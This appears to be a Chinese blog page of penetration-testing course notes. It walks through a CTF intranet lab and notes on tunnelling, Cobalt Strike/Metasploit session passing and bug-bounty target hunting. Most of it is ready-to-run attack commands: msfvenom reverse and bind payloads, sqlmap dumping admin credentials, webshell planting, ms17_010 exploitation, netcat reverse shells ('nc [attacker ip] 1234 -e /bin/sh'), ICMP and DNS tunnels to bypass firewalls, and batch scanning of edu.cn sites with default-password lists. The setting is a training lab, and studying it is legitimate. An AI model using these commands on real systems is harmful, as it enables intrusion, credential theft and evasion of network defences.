<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#案例3	CFS三层内网漫游安全测试演练-某CTF线下2019</span></span><br><span class="line">每台服务器一个flag</span><br><span class="line"></span><br><span class="line"><span class="comment">#	target1</span></span><br><span class="line">web漏洞thinkphp5.x_rce 用工具使用对应exp写入后门</span><br><span class="line"></span><br><span class="line">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<span class="number">192.168</span><span class="number">.76</span><span class="number">.132</span> LPORT=<span class="number">1111</span> -f elf &gt;t1.elf</span><br><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload linux/x64/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> LHOST <span class="number">192.168</span><span class="number">.76</span><span class="number">.132</span></span><br><span class="line"><span class="built_in">set</span> LPORT <span class="number">1111</span></span><br><span class="line">exploit</span><br><span class="line"></span><br><span class="line"><span class="comment">#	信息收集</span></span><br><span class="line">探索内网并添加路由，从而发现和联系上内网</span><br><span class="line">获取网络接口: run get_local_subnets</span><br><span class="line">查看路由地址: run autoroute -p</span><br><span class="line">添加路由地址:	run autoroute -s <span class="number">192.168</span><span class="number">.22</span><span class="number">.0</span>/<span class="number">24</span>				<span class="comment">#这一步msf会话中kali可以访问到2级内网</span></span><br><span class="line">在target1上创建代理</span><br><span class="line">开启本地代理:</span><br><span class="line">    use auxiliary/server/socks4a			socks_proxy	</span><br><span class="line">    <span class="built_in">set</span> srvport <span class="number">2222</span>						<span class="comment">#把访问内网的功能映射到kali的2222端口</span></span><br><span class="line">    exploit</span><br><span class="line">    </span><br><span class="line"><span class="comment">#	利用本地代理接口访问测试</span></span><br><span class="line">linux</span><br><span class="line">    配置proxychains后调用探针target2</span><br><span class="line">    /etc/proxychains.conf						/etc/proxychains4.conf</span><br><span class="line">    	socks4 <span class="number">192.168</span><span class="number">.76</span><span class="number">.132</span> <span class="number">2222</span>				socks5</span><br><span class="line">    proxychains4 curl cip.cc				<span class="comment">#进行测试</span></span><br><span class="line">    proxychains4 nmap -sT -Pn <span class="number">192.168</span><span class="number">.22</span><span class="number">.0</span>/<span class="number">24</span> -p80</span><br><span class="line">        -Pn 不适用ping扫描，不执行主机发现，默认目标主机是存活的，可以绕开防火墙</span><br><span class="line">        -sT 使用TCP连接，与目标三次握手，来确定端口是否开放</span><br><span class="line">windows</span><br><span class="line">	利用代理工具Proxifier(全局)或SocksCap64(可选择应用)载入进行进程访问测试</span><br><span class="line">工具</span><br><span class="line">	为了顺利访问到Target2的网页，需要设置浏览器代理进行访问</span><br><span class="line">    其他工具也需要设置代理</span><br><span class="line">    火狐设置代理	socks5</span><br><span class="line"></span><br><span class="line">msf中把会话放入后台 background</span><br><span class="line">	返回上级目录 back</span><br><span class="line">    </span><br><span class="line"><span class="comment">#	target2</span></span><br><span class="line">注入</span><br><span class="line">http://<span class="number">192.168</span><span class="number">.22</span><span class="number">.128</span>/index.php?r=vul&amp;keyword=<span class="number">1</span>				<span class="comment">#sql注入</span></span><br><span class="line">    <span class="number">1.</span>sqlmap -u <span class="string">&quot;http://192.168.22.129/index.php?r=vul&amp;keyword=1&quot;</span> --proxy=socks4://<span class="number">192.168</span><span class="number">.75</span><span class="number">.132</span>:<span class="number">2222</span> --dbs</span><br><span class="line">	<span class="number">2.</span>sqlmap -u <span class="string">&quot;http://192.168.22.129/index.php?r=vul&amp;keyword=1&quot;</span> --proxy=socks4://<span class="number">192.168</span><span class="number">.75</span><span class="number">.132</span>:<span class="number">2222</span> -D bagecms --tables </span><br><span class="line">	<span class="number">3.</span>sqlmap -u <span class="string">&quot;http://192.168.22.129/index.php?r=vul&amp;keyword=1&quot;</span> --proxy=socks4://<span class="number">192.168</span><span class="number">.75</span><span class="number">.132</span>:<span class="number">2222</span> -D begacms -T bage_admin --columns</span><br><span class="line">	<span class="number">4.</span>sqlmap -u <span class="string">&quot;http://192.168.22.129/index.php?r=vul&amp;keyword=1&quot;</span> --proxy=socks4://<span class="number">192.168</span><span class="number">.75</span><span class="number">.132</span>:<span class="number">2222</span> -D begacms -T bage_admin -C username,password --dump</span><br><span class="line"></span><br><span class="line">http://<span class="number">192.168</span><span class="number">.22</span><span class="number">.128</span>/index.php?r=admini/public/login    	<span class="comment">#后台</span></span><br><span class="line">http://<span class="number">192.168</span><span class="number">.22</span><span class="number">.128</span>/index.php?r=special                	<span class="comment">#模板写入后门shell</span></span><br><span class="line">通过robots.txt找到后台登录地址，通过后台功能拿webshell</span><br><span class="line"></span><br><span class="line"><span class="number">1.</span>生成正向后门</span><br><span class="line">	msfvenom -p linux/x64/meterpreter/bind_tcp LPORT=<span class="number">3333</span> -f elf &gt; t2.elf</span><br><span class="line"><span class="number">2.</span>监听</span><br><span class="line">	use exploit/multi/handler</span><br><span class="line">    <span class="built_in">set</span> payload linux/x64/meterpreter/bind_tcp</span><br><span class="line">    <span class="built_in">set</span> rhost <span class="number">192.168</span><span class="number">.22</span><span class="number">.128</span></span><br><span class="line">    <span class="built_in">set</span> LPORT <span class="number">3333</span></span><br><span class="line">    exploit</span><br><span class="line"><span class="number">3.</span>信息收集配置访问</span><br><span class="line">获取网络接口: run get_local_subnets</span><br><span class="line">查看路由地址: run autoroute -p</span><br><span class="line">添加路由地址: run autoroute -s <span class="number">192.168</span><span class="number">.33</span><span class="number">.0</span>/<span class="number">24</span></span><br><span class="line"><span class="number">4.</span>利用本地代理接口访问测试</span><br><span class="line"></span><br><span class="line"><span class="comment">#	target3</span></span><br><span class="line">漏洞利用，找到flag</span><br><span class="line">proxychains nmap -Pn -sT <span class="number">192.168</span><span class="number">.33</span><span class="number">.33</span></span><br><span class="line">use exploit/windows/smb/ms17_010_psexec</span><br><span class="line"><span class="built_in">set</span> payload windows/meterpreter/bind_tcp</span><br><span class="line"><span class="built_in">set</span> RHOST <span class="number">192.168</span><span class="number">.33</span><span class="number">.33</span></span><br><span class="line">exploit</span><br><span class="line">shell</span><br><span class="line"><span class="built_in">dir</span> /S flag.txt /B</span><br><span class="line"><span class="built_in">type</span> xxxxx.txt</span><br></pre></td></tr></table></figure>

<h3 id="day71-内网安全-域横向网络-amp-传输-amp-应用层隧道技术"><a href="#day71-内网安全-域横向网络-amp-传输-amp-应用层隧道技术" class="headerlink" title="day71-内网安全-域横向网络&amp;传输&amp;应用层隧道技术"></a>day71-内网安全-域横向网络&amp;传输&amp;应用层隧道技术</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line">必备知识点</span><br><span class="line">	<span class="number">1.</span>代理和隧道技术区别</span><br><span class="line">		代理可以解决访问问题，从一个局域网访问另一个局域网</span><br><span class="line">		隧道会重新封装数据包，将需要发送的数据包打包进新的数据包内，然后发送这个新数据包，在网络终点将数据解包并转发到最终目的地。</span><br><span class="line">		注意隧道技术指的是包括数据封装、传输和解包在内的全过程。</span><br><span class="line">		隧道提供保密性和安全性，可以绕过边界设备和防火墙等检测设备。隧道技术的代表有VPN</span><br><span class="line">	<span class="number">2.</span>隧道技术为了解决什么？</span><br><span class="line">		在数据通信被拦截的情况下利用隧道技术封装改变通信协议进行绕过拦截</span><br><span class="line">		CS、MSF无法上线，数据传输不稳定无回显，出口数据被监控，网络通信存在问题等</span><br><span class="line">	<span class="number">3.</span>隧道技术前期的必备条件</span><br><span class="line">		已获得一定的控制权，但是不能对控制的东西进行信息收集或者执行它上面的东西在数据通信被拦截的情况下利用隧道技术封装改变通信协议进行绕过拦截CS、MSF无法上线，数据传输不稳定无回显，出口数据被监控，网络通信存在问题等。</span><br><span class="line">        在实际网络中，通常会通过各种边界设备、软/硬件防火墙甚至入侵检测系统来检查对外连接情况，如果发现异样，就会对通信进行阻断。</span><br><span class="line">        隧道 即一种绕过端口屏蔽的通信方式。防火墙两端的数据包通过防火墙所允许的数据包类型或者端口进行封装，然后穿过防火墙，与对方进行通信。当封装的数据包到达目的地时，将数据包还原，并将还原后的数据包发送到相应的服务器上。</span><br><span class="line">	</span><br><span class="line"><span class="comment">#	常用隧道技术以下3种</span></span><br><span class="line">	<span class="number">1.</span>网络层:IPV6隧道、ICMP隧道</span><br><span class="line">	<span class="number">2.</span>传输层：TCP、UDP、端口转发</span><br><span class="line">	<span class="number">3.</span>应用层：SSH、HTTP/S、DNS</span><br><span class="line"></span><br><span class="line"><span class="comment">#	网络传输应用层检测连通性-检测</span></span><br><span class="line">在使用隧道协议前，需要确定网络是否正常通讯 是否能使用这个协议</span><br><span class="line"><span class="number">1.</span>TCP协议</span><br><span class="line">	瑞士军刀netcat 		nc &lt;IP&gt; &lt;端口&gt;</span><br><span class="line"><span class="number">2.</span>HTTP协议</span><br><span class="line">	curl &lt;ip:端口&gt;</span><br><span class="line"><span class="number">3.</span>ICMP协议</span><br><span class="line">	ping &lt;ip/域名&gt;</span><br><span class="line"><span class="number">4.</span>dns协议</span><br><span class="line">	检测DNS连通性常用命令nslookup和dig</span><br><span class="line">	nslookup是windows自带的DNS探测命令</span><br><span class="line">	dig是Linux...</span><br><span class="line">	</span><br><span class="line"><span class="comment">#	网络层ICMP隧道ptunnel使用-检测，利用</span></span><br><span class="line">pingtunnel是tcp/udp/sock5流量伪装成icmp流量进行转发的工具</span><br><span class="line">	-p 标识连接icmp隧道另一端的机器ip(目标服务器)</span><br><span class="line">	-lp 标识需要监听的本地tcp端口</span><br><span class="line">	-da 指定需要转发的本地tcp端口</span><br><span class="line">	-dp 执行需要转发的机器IP(即目标内网某一机器的内网ip)</span><br><span class="line">	-x 设置连接的密码</span><br><span class="line">在中介机webserver执行</span><br><span class="line">	./ptunnel -x 密码</span><br><span class="line">	./ptunnel -x xiaodi</span><br><span class="line">在攻击机hacker xiaodi执行:</span><br><span class="line">	./ptunnel -p [中介机] -lp [本机端口] -da [被攻击机] -dp [被攻击端口] -x [密码]</span><br><span class="line">	./ptunnel -p <span class="number">192.168</span><span class="number">.76</span><span class="number">.150</span> -lp <span class="number">1080</span> -da <span class="number">192.168</span><span class="number">.33</span><span class="number">.33</span> -dp <span class="number">3389</span> -x xiaodi</span><br><span class="line">当<span class="number">192.168</span><span class="number">.76</span><span class="number">.150</span>(p)收到来自<span class="number">192.168</span><span class="number">.33</span><span class="number">.33</span>(da)的<span class="number">3389</span>端口(dp)数据时，发送到本机(攻击机)的<span class="number">1080</span>端口(lp).反之依然(二者之间建立隧道)</span><br><span class="line">	rdesktop [IP] [端口]</span><br><span class="line">	rdesktop <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="number">1080</span></span><br><span class="line">调用远程桌面访问本地<span class="number">1080</span>，也就是目标机的<span class="number">3389</span></span><br><span class="line">老版本介绍	https://github.com/f1vefour/ptunnel(需自行编译)</span><br><span class="line">新版本介绍	https://github.com/esrrhs/pingtunnel(二次开发版)</span><br><span class="line"></span><br><span class="line"><span class="comment">#	传输层转发隧道Portmap使用-检测，利用</span></span><br><span class="line">win:	lck</span><br><span class="line">linux:	portmap</span><br><span class="line">被攻击机:	lck-slave [中介机ip] <span class="number">3131</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="number">3389</span></span><br><span class="line"> 	将(被攻击机)本地<span class="number">3389</span>跟中介机<span class="number">3131</span>建立隧道</span><br><span class="line">在中介机上:</span><br><span class="line">    lck -listen [本机端口] [攻击机端口]</span><br><span class="line">    lck -listen <span class="number">3131</span> <span class="number">3333</span></span><br><span class="line">    监听<span class="number">3131</span>转发到<span class="number">3333</span></span><br><span class="line">攻击机上:</span><br><span class="line">    rdesktop [中介机ip]:<span class="number">3333</span></span><br><span class="line">    远程连接</span><br><span class="line">    </span><br><span class="line"><span class="comment">#	传输层转发隧道Netcat使用-检测，利用，功能</span></span><br><span class="line">要确定为是否为最新版本，老版本不支持-e写法</span><br><span class="line">linux自带nc</span><br><span class="line">受害主机能找到攻击机就用正向，不能则用反向</span><br><span class="line"><span class="number">1.</span>双向连接反弹shell</span><br><span class="line">	正向:	攻击连接受害</span><br><span class="line">        受害</span><br><span class="line">            nc -ldp <span class="number">1234</span> -e /<span class="built_in">bin</span>/sh				//linux</span><br><span class="line">            nc -ldp <span class="number">1234</span> -e c:\windows\system32\cmd.exe		<span class="comment">#win</span></span><br><span class="line">     		将命令行界面(shell/cmd)推到<span class="number">1234</span>端</span><br><span class="line">        攻击</span><br><span class="line">        	nc <span class="number">192.168</span><span class="number">.76</span><span class="number">.132</span> <span class="number">1234</span></span><br><span class="line">        	主动连接</span><br><span class="line">	反向：受害连接攻击</span><br><span class="line">    	攻击</span><br><span class="line">        	nc -lvp <span class="number">1234</span></span><br><span class="line">            监听<span class="number">1234</span>端口</span><br><span class="line">        受害</span><br><span class="line">        	nc [攻击机ip] <span class="number">1234</span> -e /<span class="built_in">bin</span>/sh</span><br><span class="line">            nc [攻击机ip] <span class="number">1234</span> -e c:\windows\system32\cmd.exe</span><br><span class="line">            命令行界面(cmd/shell)推到攻击机ip的<span class="number">1234</span>端</span><br><span class="line"><span class="number">2.</span>多向连接反弹shell-配合转发</span><br><span class="line">反向:</span><br><span class="line">    god\Webserver:</span><br><span class="line">        Lcx.exe -listen <span class="number">2222</span> <span class="number">3333</span></span><br><span class="line">    god\Sqlserver:</span><br><span class="line">		nc <span class="number">192.168</span><span class="number">.3</span><span class="number">.31</span> <span class="number">2222</span> -e c:\windows\system32\cmd.exe</span><br><span class="line">    kali:</span><br><span class="line">        nc -v <span class="number">192.168</span><span class="number">.76</span><span class="number">.143</span> <span class="number">3333</span></span><br><span class="line">    SQL服务器将自己的cmd映射到网络服务器的<span class="number">2222</span>端口，网络服务器再将<span class="number">2222</span>映射到自己的<span class="number">3333</span>端口，最后由攻击机访问</span><br><span class="line"><span class="number">3.</span>相关netcat主要功能测试</span><br><span class="line">指纹服务	nc -nv <span class="number">192.168</span><span class="number">.76</span><span class="number">.143</span></span><br><span class="line">端口扫描	nc -v -z <span class="number">192.68</span><span class="number">.76</span><span class="number">.143</span> <span class="number">1</span>-<span class="number">1000</span></span><br><span class="line">端口监听	nc -lvp xxxx</span><br><span class="line">文件传输	nc -lp <span class="number">1111</span>&gt;<span class="number">1.</span>txt|nc -vn xx.xx.xx.xx <span class="number">1111</span>&lt;<span class="number">1.</span>txt -q <span class="number">1</span></span><br><span class="line">反弹shell		见上</span><br><span class="line"></span><br><span class="line"><span class="comment">#	应用层DNS隧道配合CS上线-检测，利用，说明</span></span><br><span class="line">当常见协议监听器被拦截时，可以换其它协议上线，其中dns协议上线基本通杀</span><br><span class="line"><span class="number">1.</span>云主机teamserver配置端口<span class="number">53</span>启用-udp</span><br><span class="line"><span class="number">2.</span>买一个域名修改记录如下：</span><br><span class="line">	A记录-&gt;cs主机名-&gt;CS服务器IP</span><br><span class="line">    NS记录-&gt;ns1主机名-&gt;上个A记录地址</span><br><span class="line">    NS记录-&gt;ns2主机名-&gt;上个A记录地址</span><br><span class="line"><span class="number">3.</span>配置DNS监听器内容如下:</span><br><span class="line">    ns1.xiaodi8.com</span><br><span class="line">    ns2.xiaodi8.com</span><br><span class="line">    cs.xiaodi8.com</span><br><span class="line"><span class="number">4.</span>生成后门执行上线后启用命令</span><br><span class="line">	beacon&gt; checkin[*]			checkin</span><br><span class="line">    Tasked beacon to checkin</span><br><span class="line">    beacon&gt; mode dns-txt</span><br><span class="line">    ...</span><br><span class="line">    beacon&gt; shell whoami</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>

<h3 id="day72-内网安全-域横向CS-amp-MSF联动及应急响应初识"><a href="#day72-内网安全-域横向CS-amp-MSF联动及应急响应初识" class="headerlink" title="day72-内网安全-域横向CS&amp;MSF联动及应急响应初识"></a>day72-内网安全-域横向CS&amp;MSF联动及应急响应初识</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#	演示案例	MSF&amp;Cobalt Strike联动shell</span></span><br><span class="line">CS-&gt;MSF</span><br><span class="line">	创建Foreign监听器-&gt;MSF监听模块设置对应地址端口-&gt;CS执行spawn选择监听器</span><br><span class="line">MSF-&gt;CS</span><br><span class="line">	CS创建监听器-&gt;MSF载入新模块注入设置对应地址端口-&gt;执行CS等待上线</span><br><span class="line"></span><br><span class="line"><span class="comment">#	CS联动MSF		虚拟机情况下 被控主机win测试成功</span></span><br><span class="line"><span class="number">1.</span>创建Foreign监听器</span><br><span class="line">	<span class="string">&quot;Listeners&quot;</span> <span class="string">&quot;Add&quot;</span> <span class="string">&quot;Name&quot;</span>填任意 <span class="string">&quot;Payload&quot;</span>选<span class="string">&quot;Foreign HTTP&quot;</span> <span class="string">&quot;HTTP Host(Stager)&quot;</span>填msf的ip地址 <span class="string">&quot;HTTP Port(stager)&quot;</span>		<span class="comment">#ip端口填的msf的</span></span><br><span class="line">    该监听器与木马绑定的监听器非同一个监听器</span><br><span class="line"><span class="number">2.</span>MSF监听模块设置对应地址端口</span><br><span class="line">    选择监听模块</span><br><span class="line">        use exploit/multi/handler</span><br><span class="line">    设置payload,注意与CS保持一致</span><br><span class="line">        <span class="built_in">set</span> payload windows/meterpreter/reverse_http</span><br><span class="line">    设置地址端口，其中地址可以不设或为<span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>，意为任意地址，或者设为msf的ip地址(与CS保持一致)；端口一定要保持一致</span><br><span class="line">    <span class="built_in">set</span> lhost <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span></span><br><span class="line">    <span class="built_in">set</span> lport <span class="number">6677</span></span><br><span class="line">   	检查设置</span><br><span class="line">    	show options</span><br><span class="line">    执行</span><br><span class="line">    	exploit</span><br><span class="line"><span class="number">3.</span>CS执行Spawn选择监听器</span><br><span class="line">	选择需要反弹shell的电脑，右键<span class="string">&quot;Spawn&quot;</span>，选择刚才生成的监听器		此处相当于cs段</span><br><span class="line">    稍等可在MSF上看见反弹结果,如果没有请检查网络</span><br><span class="line">    </span><br><span class="line"><span class="comment">#	MFS联动CS		虚拟机情况下 被控主机win测试成功</span></span><br><span class="line"><span class="number">1.</span>CS创建监听器</span><br><span class="line">	创建一个普通监听器</span><br><span class="line"><span class="number">2.</span>MSF载入新模块注入设置对应地址端口</span><br><span class="line">	首先查看session值</span><br><span class="line">    	background</span><br><span class="line">    	sessions</span><br><span class="line">    载入注入模块并设置，注意跟CS监听器保持一致		<span class="comment">#reverse_http</span></span><br><span class="line">    	use exploit/windows/local/payload_inject</span><br><span class="line">        <span class="built_in">set</span> payload windows/meterpreter/reverse_http</span><br><span class="line">        <span class="built_in">set</span> lport [CS的端口号]</span><br><span class="line">        <span class="built_in">set</span> lhost [CS的ip]</span><br><span class="line">        <span class="built_in">set</span> session [session的<span class="built_in">id</span>]</span><br><span class="line">        exploit</span><br><span class="line">      </span><br><span class="line"><span class="comment">#	加入新的条件</span></span><br><span class="line">	<span class="number">1.</span>外网</span><br><span class="line">    <span class="number">2.</span>linux 被控机器 linux制作马</span><br><span class="line">    <span class="number">3.</span>不出网 socks5代理或者别的代理软件</span><br><span class="line">    </span><br><span class="line"><span class="comment">#	应急响应</span></span><br><span class="line">......</span><br></pre></td></tr></table></figure>























<h3 id="day76-Python开发-内外网收集Socket-amp-子域名-amp-DNS"><a href="#day76-Python开发-内外网收集Socket-amp-子域名-amp-DNS" class="headerlink" title="day76-Python开发-内外网收集Socket&amp;子域名&amp;DNS"></a>day76-Python开发-内外网收集Socket&amp;子域名&amp;DNS</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">前期信息收集</span><br><span class="line">	外网</span><br><span class="line">		IP/Whois CDN判断 端口扫描 子域名收集 第三方调用</span><br><span class="line">	内网</span><br><span class="line">		存活主机 协议探针 端口扫描</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Socket部分技术 进程命令执行 交互参数执行 NMAP工具模块使用 异常处理</span></span><br></pre></td></tr></table></figure>



<h3 id="day86-SRC挖掘-教育行业平台-amp-规则-amp-批量自动化"><a href="#day86-SRC挖掘-教育行业平台-amp-规则-amp-批量自动化" class="headerlink" title="day86-SRC挖掘-教育行业平台&amp;规则&amp;批量自动化"></a>day86-SRC挖掘-教育行业平台&amp;规则&amp;批量自动化</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">src挖掘</span><br><span class="line">	教育漏洞平台</span><br><span class="line">		规则		法律法规 漏洞说明 评分奖励</span><br><span class="line">		思路 		常规安全</span><br><span class="line">					Xray AWVS 平台默认弱口令</span><br><span class="line">				 定点检测</span><br><span class="line">				 	ThinkPhp代码执行 Shiro反序列化 fastjson反序列化</span><br><span class="line">	CNVD</span><br><span class="line">	盒子 补天 其他</span><br></pre></td></tr></table></figure>

<p><img src="/2023/07/05/b%E7%AB%99%E5%B0%8F%E8%BF%AA2020/1676471444688.png" alt="1676471444688"></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 	教育机构</span></span><br><span class="line">1.批量爬取网址</span><br><span class="line">	教育类网站		 		  edu.cn</span><br><span class="line">	python批量fofa 			<span class="string">&quot;edu.cn&quot;</span> &amp;&amp; country=<span class="string">&quot;CN&quot;</span></span><br><span class="line">2.漏扫工具搞</span><br><span class="line">3.定点检测</span><br><span class="line">	https://www.seebug.org/vuldb/vulnerabilities</span><br><span class="line">	针对特定漏洞复现 举例timeline sec团队的 批量检测</span><br><span class="line">		https://github.com/TimelineSec/2020-Vulnerabilities已下载</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">弱口令项目地址</span><br><span class="line">	https://github.com/ihebski/DefaultCreds-cheat-sheet</span><br><span class="line">		C:\Users\hyy\Desktop\网络安全\小迪网安\DefaultCreds-cheat-sheet-main\DefaultCreds-Cheat-Sheet.csv</span><br><span class="line">		常见平台的弱口令</span><br></pre></td></tr></table></figure>



<h3 id="day88-SRC挖掘-拿下CNVD证书开源-amp-闭源-amp-售卖系统"><a href="#day88-SRC挖掘-拿下CNVD证书开源-amp-闭源-amp-售卖系统" class="headerlink" title="day88-SRC挖掘-拿下CNVD证书开源&amp;闭源&amp;售卖系统"></a>day88-SRC挖掘-拿下CNVD证书开源&amp;闭源&amp;售卖系统</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">CNVD漏洞平台</span><br><span class="line">	条件 通用性100+（影响资产）</span><br><span class="line">    分类</span><br><span class="line">    	开源		代码审计 自动扫描</span><br><span class="line">    	闭源</span><br><span class="line">    		尝试性获取源码</span><br><span class="line">    		无源码下JS接口测试</span><br><span class="line">    		常规类黑盒安全测试</span><br><span class="line">    	售卖</span><br><span class="line">    		尝试性获取源码</span><br><span class="line">    		无源码下JS接口测试</span><br><span class="line">    		常规类黑盒安全测试</span><br><span class="line">    技术</span><br><span class="line">    	代码审计 	PHP .NET JAVA</span><br><span class="line">    	影响查找	黑暗引擎 白白引擎</span><br></pre></td></tr></table></figure>
                
            </div>
            <hr/>

            

    <div class="reprint" id="reprint-statement">
        
            <div class="reprint__author">
                <span class="reprint-meta" style="font-weight: bold;">
                    <i class="fas fa-user">
                        文章作者:
                    </i>
                </span>
                <span class="reprint-info">
                    <a href="/about" rel="external nofollow noreferrer">John Doe</a>
                </span>
